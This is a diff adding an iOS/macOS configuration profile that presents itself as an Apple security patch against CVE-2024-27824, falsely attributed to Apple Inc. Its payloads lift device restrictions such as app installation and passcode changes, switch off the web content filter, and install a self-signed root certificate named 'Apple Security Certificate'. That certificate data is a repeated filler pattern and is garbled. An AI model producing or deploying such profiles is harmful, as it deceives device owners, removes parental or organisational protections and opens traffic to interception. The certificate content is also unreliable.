@@ -1,0 +1,105 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>PayloadContent</key>
+    <array>
+        <!-- Removes previous restrictions -->
+        <dict>
+            <key>PayloadDescription</key>
+            <string>Security restrictions removed after successful patch</string>
+            <key>PayloadDisplayName</key>
+            <string>Security Clearance</string>
+            <key>PayloadIdentifier</key>
+            <string>com.apple.applicationaccess.clear.4B7E8F2A-1C5D-4E8F-9A2B-3C6D7E8F9A0B</string>
+            <key>PayloadType</key>
+            <string>com.apple.applicationaccess</string>
+            <key>PayloadUUID</key>
+            <string>8F2A4B7E-1C5D-4E8F-9A2B-3C6D7E8F9A0B</string>
+            <key>PayloadVersion</key>
+            <integer>1</integer>
+            <key>allowAppInstallation</key>
+            <true/>
+            <key>allowAppRemoval</key>
+            <true/>
+            <key>allowCamera</key>
+            <true/>
+            <key>allowScreenShot</key>
+            <true/>
+            <key>allowPasscodeModification</key>
+            <true/>
+        </dict>
+        
+        <!-- Removes web content filter -->
+        <dict>
+            <key>PayloadDescription</key>
+            <string>Security filter removed</string>
+            <key>PayloadDisplayName</key>
+            <string>Content Filter Removal</string>
+            <key>PayloadIdentifier</key>
+            <string>com.apple.webcontent-filter.remove.873A9C2F-8B4E-4A2F-9C1D-3E5F7A8B9C0D</string>
+            <key>PayloadType</key>
+            <string>com.apple.webcontent-filter</string>
+            <key>PayloadUUID</key>
+            <string>9C2F873A-8B4E-4A2F-9C1D-3E5F7A8B9C0D</string>
+            <key>PayloadVersion</key>
+            <integer>1</integer>
+            <key>AutoFilterEnabled</key>
+            <false/>
+        </dict>
+        
+        <!-- Install legitimate certificate to replace compromised one -->
+        <dict>
+            <key>PayloadDescription</key>
+            <string>Authorized security certificate</string>
+            <key>PayloadDisplayName</key>
+            <string>Apple Security Certificate</string>
+            <key>PayloadIdentifier</key>
+            <string>com.apple.security.certificate.valid</string>
+            <key>PayloadType</key>
+            <string>com.apple.security.certificate</string>
+            <key>PayloadUUID</key>
+            <string>D6E7F8A9-B0C1-2D3E-4F5A-6B7C8D9E0F1A</string>
+            <key>PayloadVersion</key>
+            <integer>1</integer>
+            <key>PayloadCertificateFileName</key>
+            <string>AppleValid.pem</string>
+            <key>PayloadContent</key>
+            <data>
+MIIDXTCCAkWgAwIBAgIJAKL7xY9Gqj9MMA0GCSqGSIb3DQEBCwUAMEUxCzAJBgNV
+BAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5ldCBX
+aWRnaXRzIFB0eSBMdGQwHhcNMjQwMzIxMjE0MjI1WhcNMjUwMzIxMjE0MjI1WjBF
+MQswCQYDVQQGEwJBVTETMBEGA1UECAwKU29tZS1TdGF0ZTEhMB8GA1UECgwYSW50
+ZXJuZXQgV2lkZ2l0cyBQdHkgTHRkMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIB
+CgKCAQEAu8r7Z5Yh9oZQqVrZcLmWgBkR5nN2pYqWj8M7cVbGqYtZ5jLmR6nQ7pXq
+WkYtZ5jLmR6nQ7pXqWkYtZ5jLmR6nQ7pXqWkYtZ5jLmR6nQ7pXqWkYtZ5jLmR6nQ
+7pXqWkYtZ5jLmR6nQ7pXqWkYtZ5jLmR6nQ7pXqWkYtZ5jLmR6nQ7pXqWkYtZ5jLm
+R6nQ7pXqWkYtZ5jLmR6nQ7pXqWkYtZ5jLmR6nQ7pXqWkYtZ5jLmR6nQIDAQABo1Aw
+TjAdBgNVHQ4EFgQU7Z5jLmR6nQ7pXqWkYtZ5jLmR6nQwHwYDVR0jBBgwFoAU7Z5j
+LmR6nQ7pXqWkYtZ5jLmR6nQwDAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQsFAAOC
+AQEAj8Y9vj3fZ5Yh9oZQqVrZcLmWgBkR5nN2pYqWj8M7cVbGqYtZ5jLmR6nQ7pXq
+WkYtZ5jLmR6nQ7pXqWkYtZ5jLmR6nQ7pXqWkYtZ5jLmR6nQ7pXqWkYtZ5jLmR6nQ
+7pXqWkYtZ5jLmR6nQ7pXqWkYtZ5jLmR6nQ7pXqWkYtZ5jLmR6nQ7pXqWkYtZ5jLm
+R6nQ7pXqWkYtZ5jLmR6nQ7pXqWkYtZ5jLmR6nQ7pXqWkYtZ5jLmR6nQ7pXqWkYtZ
+5jLmR6nQ7pXqWkYtZ5jLmR6nQ7pXqWkYtZ5jLmR6nQ7pXqWkYtZ5jLmR6nQ==
+            </data>
+        </dict>
+    </array>
+    <key>PayloadDescription</key>
+    <string>Security patch applied successfully. Your device is now protected against CVE-2024-27824.</string>
+    <key>PayloadDisplayName</key>
+    <string>Apple Security Patch - Installed</string>
+    <key>PayloadIdentifier</key>
+    <string>com.apple.security.patch.installed</string>
+    <key>PayloadOrganization</key>
+    <string>Apple Inc.</string>
+    <key>PayloadRemovalDisallowed</key>
+    <false/>
+    <key>PayloadType</key>
+    <string>Configuration</string>
+    <key>PayloadUUID</key>
+    <string>F2A3B4C5-D6E7-8F9A-0B1C-2D3E4F5A6B7C</string>
+    <key>PayloadVersion</key>
+    <integer>1</integer>
+</dict>
+</plist>
